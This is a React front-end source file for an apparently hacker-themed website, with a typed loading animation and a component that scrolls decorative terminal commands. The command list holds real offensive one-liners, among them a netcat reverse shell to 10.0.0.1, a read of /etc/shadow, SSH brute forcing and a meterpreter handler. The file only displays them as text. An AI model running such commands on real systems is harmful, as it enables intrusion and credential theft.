import { useState, useEffect, useRef, lazy, Suspense } from 'react';
import { gsap } from 'gsap';
import GridScan from './components/Gridscan';
import VideoLoadingScreen from './components/VideoLoadingScreen';

// Lazy load main content for better performance
const MainContent = lazy(() => import('./components/MainContent'));

// Preload MainContent while showing loading screen
const mainContentPromise = import('./components/MainContent');

const hackingSteps = [
  { text: 'Initializing secure connection...', status: 'DONE' },
  { text: 'Reconing the target...', status: 'DONE' },
  { text: 'Scanning open ports...', status: 'DONE' },
  { text: 'Finding vulnerabilities...', status: 'DONE' },
  { text: 'Exploit successful', status: 'ACCESS GRANTED' },
];

const App = () => {
  const [isVideoLoading, setIsVideoLoading] = useState(true);
  const [isLoading, setIsLoading] = useState(true);
  const [currentStep, setCurrentStep] = useState(0);
  const [displayedText, setDisplayedText] = useState('');
  const [showStatus, setShowStatus] = useState(false);
  const [progress, setProgress] = useState(0);
  const [contentReady, setContentReady] = useState(false);
  const [animationComplete, setAnimationComplete] = useState(false);
  
  const containerRef = useRef(null);
  const progressBarRef = useRef(null);

  // Preload content while showing loading animation
  useEffect(() => {
    mainContentPromise.then(() => setContentReady(true));
  }, []);

  // Typing effect for each step
  useEffect(() => {
    if (!isLoading || isVideoLoading) return;
    
    if (currentStep >= hackingSteps.length) {
      setAnimationComplete(true);
      return;
    }

    const step = hackingSteps[currentStep];
    let charIndex = 0;
    setDisplayedText('');
    setShowStatus(false);

    const typeInterval = setInterval(() => {
      if (charIndex <= step.text.length) {
        setDisplayedText(step.text.slice(0, charIndex));
        charIndex++;
      } else {
        clearInterval(typeInterval);
        setShowStatus(true);
        
        // Update progress
        const newProgress = ((currentStep + 1) / hackingSteps.length) * 100;
        if (progressBarRef.current) {
          gsap.to(progressBarRef.current, {
            width: `${newProgress}%`,
            duration: 0.5,
            ease: 'power2.out',
          });
        }
        setProgress(newProgress);

        // Move to next step quickly
        setTimeout(() => {
          setCurrentStep(prev => prev + 1);
        }, 100);
      }
    }, 10);

    return () => clearInterval(typeInterval);
  }, [currentStep, isLoading, isVideoLoading]);

  // Only transition when both animation is complete AND content is loaded
  useEffect(() => {
    if (animationComplete && contentReady) {
      setTimeout(() => {
        gsap.to(containerRef.current, {
          opacity: 0,
          scale: 1.05,
          filter: 'blur(5px)',
          duration: 0.8,
          ease: 'power2.inOut',
          onComplete: () => setIsLoading(false),
        });
      }, 300);
    }
  }, [animationComplete, contentReady]);

  return (
    <div className="min-h-screen text-white" style={{ backgroundColor: '#020625' }}>
      {/* Video Loading Screen */}
      {isVideoLoading && (
        <VideoLoadingScreen onLoadingComplete={() => setIsVideoLoading(false)} />
      )}

      {/* Main Content - Shows after video completes with smooth fade-in */}
      {!isVideoLoading && (
        <Suspense fallback={null}>
          <div
            style={{
              animation: 'fadeIn 0.8s ease-in-out',
            }}
          >
            <style>{`
              @keyframes fadeIn {
                from {
                  opacity: 0;
                  transform: translateY(20px);
                }
                to {
                  opacity: 1;
                  transform: translateY(0);
                }
              }
            `}</style>
            <MainContent />
          </div>
        </Suspense>
      )}
    </div>
  );
};

// Meaningful hacking commands stream
const RandomDataStream = () => {
  const [lines, setLines] = useState([]);

  const hackingCommands = [
    'nmap -sV -sC -p- 192.168.1.105 --script=vuln',
    'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target',
    'sqlmap -u "http://target/page?id=1" --dbs --batch',
    'msfconsole -q -x "use exploit/multi/handler"',
    'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
    'gobuster dir -u http://target -w /usr/share/dirb/wordlists/common.txt',
    'nikto -h http://target -output scan_results.txt',
    'wpscan --url http://target --enumerate u,p,t',
    'searchsploit apache 2.4.49 | grep -i "remote"',
    'curl -X POST http://target/api/login -d "user=admin&pass=test"',
    'hashcat -m 0 -a 0 hashes.txt wordlist.txt --force',
    'netcat -lvnp 4444 > Listening on 0.0.0.0:4444',
    'python3 exploit.py --target 192.168.1.105 --lhost 10.0.0.1',
    'aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap',
    'metasploit: payload => windows/meterpreter/reverse_tcp',
    'chmod +x reverse_shell.sh && ./reverse_shell.sh',
    'nc -e /bin/bash 10.0.0.1 4444 # reverse shell established',
    'cat /etc/shadow | grep root > Extracting password hashes...',
    'sudo tcpdump -i eth0 -w capture.pcap -c 1000',
    'crackmapexec smb 192.168.1.0/24 -u admin -p password123',
  ];

  useEffect(() => {
    const addLine = () => {
      const cmd = hackingCommands[Math.floor(Math.random() * hackingCommands.length)];
      setLines(prev => {
        const newLines = [...prev, cmd];
        if (newLines.length > 4) newLines.shift();
        return newLines;
      });
    };

    addLine();
    const interval = setInterval(addLine, 800);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="space-y-1">
      {lines.map((line, i) => (
        <div key={i} className="truncate opacity-60 hover:opacity-100 transition-opacity">
          <span className="text-[#00ffff]">$ </span>{line}
        </div>
      ))}
    </div>
  );
};

export default App;